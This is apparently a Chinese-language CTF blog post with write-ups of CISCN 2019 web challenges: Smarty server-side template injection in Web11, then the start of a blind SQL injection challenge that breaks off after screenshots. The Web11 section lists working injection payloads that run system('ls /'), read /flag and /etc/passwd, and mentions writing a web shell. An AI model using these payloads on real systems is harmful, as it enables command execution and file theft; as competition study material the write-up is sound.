
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>CISCN国赛 - hybcx's blog</title>

  
    <meta name="description" content="[CISCN 2019华东南]Web11  首页展示了该公共地址API的一些功能，这里容易想到可能为SSTI注入，抓包然后添加xff头，进行ssti测试  确定为ssti了，同时首页提示我们这是smarty框架，并且后端语言也是PHP。直接上payload即可  这里看了wp发现还有很多姿势，做个记录 {$smarty.version}			&#x2F;&#x2F;smarty的版本号  #可以使用{php}{&#x2F;ph">
<meta property="og:type" content="article">
<meta property="og:title" content="CISCN国赛">
<meta property="og:url" content="http://hybcx.xyz/2024/01/24/ctf-shua-ti-zhi-lu/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="[CISCN 2019华东南]Web11  首页展示了该公共地址API的一些功能，这里容易想到可能为SSTI注入，抓包然后添加xff头，进行ssti测试  确定为ssti了，同时首页提示我们这是smarty框架，并且后端语言也是PHP。直接上payload即可  这里看了wp发现还有很多姿势，做个记录 {$smarty.version}			&#x2F;&#x2F;smarty的版本号  #可以使用{php}{&#x2F;ph">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124152404835.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124153746232.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124153858785.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124155949219.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124160015823.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124161453566.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124161508716.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124164241331.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172310599.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172543945.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172614227.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172728776.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124173537688.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124173957173.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124174050592.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124181101487.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205221800.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205950545.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205832323.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205907430.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117222052443.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117222213855.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118092031351.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118092024158.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118094613051.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118094606060.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214153537023.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214153957044.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214154629894.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214155059319.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214162053535.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214162106093.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214162139797.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214164725083.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214164719459.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214165107909.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214165207754.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214165349178.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302094137727.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302095222394.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302095255581.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302103834036.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302104834951.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302104841760.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302105135582.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302112648852.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302112701521.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302112722938.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302144515978.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302144636962.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302144953252.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302153843422.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302153949857.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302155435429.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302160351776.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302183654650.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302183729913.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302184014372.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302184235328.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302185908905.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302190036705.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302202119148.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302202133493.png">
<meta property="og:image" content="c:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240303145950542.png">
<meta property="article:published_time" content="2024-01-24T07:04:00.336Z">
<meta property="article:modified_time" content="2024-03-03T07:41:46.686Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="CTF赛事">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124152404835.png">
  
  
  
  <meta name="keywords" content="CTF赛事">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/05/26/flask-nei-cun-ma-xue-xi/"><span class="title">Flask内存马学习</span></a><a class="item title" href="/2024/05/12/h-nctf2024/"><span class="title">H&NCTF2024</span></a><a class="item title" href="/2024/05/21/ciscn-2024wp/"><span class="title">CISCN-2024Wp</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-缓冲区溢出学习</span></a><a class="item title" href="/2024/05/05/di-shi-wu-jie-quan-qian-bei-wp/"><span class="title">第十五届圈钱杯wp</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF%E8%B5%9B%E4%BA%8B/">CTF赛事</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-01-24T07:04:00.336Z">2024-01-24</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-03-03T07:41:46.686Z">2024-03-03</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>CISCN国赛</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="ciscn-2019华东南web11">[CISCN 2019华东南]Web11</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124152404835.png" alt="image-20240124152404835"></p>
<p>首页展示了该公共地址API的一些功能，这里容易想到可能为SSTI注入，抓包然后添加xff头，进行ssti测试</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124153746232.png" alt="image-20240124153746232"></p>
<p>确定为ssti了，同时首页提示我们这是smarty框架，并且后端语言也是PHP。直接上payload即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124153858785.png" alt="image-20240124153858785"></p>
<p>这里看了wp发现还有很多姿势，做个记录</p>
<pre><code class="hljs PHP">{<span class="hljs-variable">$smarty</span>.version}			<span class="hljs-comment">//smarty的版本号</span>

<span class="hljs-comment">#可以使用{php}{/php}标签来执行被包裹其中的php指令</span>
{php}<span class="hljs-title function_ invoke__">phpinfo</span>();{/php}
<span class="hljs-comment">#注：Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</span>

<span class="hljs-comment">#{literal}可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</span>
{literal}<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">'xss'</span>);{/literal} <span class="hljs-comment">//xss攻击 ---适用于PHP5</span>

<span class="hljs-comment">#它相比较于{php}{/php}不同的是添加了一些特性。每个{if}必须有配对的{/if}，也可以用{else}和{else if},所有的php条件表达式和函数都可以在if内使用，比如||,or,and,&amp;等</span>
{<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">phpinfo</span>()}{/<span class="hljs-keyword">if</span>}
{<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">readfile</span> (<span class="hljs-string">'/flag'</span>)}{/<span class="hljs-keyword">if</span>}
{<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'ls /'</span>)}{/<span class="hljs-keyword">if</span>}
{<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">'/flag'</span>)}{/<span class="hljs-keyword">if</span>}</code></pre>
<h2 id="静态方法利用">静态方法利用</h2>
<p>通过self获取Smarty类再调用其静态方法实现文件读写 ——旧版本</p>
<p>Smarty类有getStreamVariable方法可以读取一个文件并返回其内容</p>
<p><code>{self::getStreamVariable(“file:///etc/passwd”)}</code></p>
<p>利用 Smarty_Internal_Write_File 类的writeFile方法来写shell</p>
<h1 id="ciscn-2019华北day2web1">[CISCN 2019华北Day2]Web1</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124155949219.png" alt="image-20240124155949219"></p>
<p>明确告诉我们是SQL注入，接下来先fuzz一下过滤字符</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124160015823.png" alt="image-20240124160015823"></p>
<p>可以看到490的都是被过滤的，很多，关键的有select，–+，//*，/**/，information，length，and等，有意思的是这题似乎还有组合过滤的情况</p>
<p>并且页面只会回显，false与true对应的页面，也就是说只能sql盲注。</p>
<p>根据题目提示的flag位于flag表、flag列下，那估计就是二分法爆破flag字符了，接下来肯定就是想如何构造合适的payload来运行py脚本。</p>
<p>这里也是陷入误区，看了wp才明白忘记判断闭合方式了，这里我们可以先尝试数学运算</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124161453566.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124161508716.png" alt="image-20240124161508716"></p>
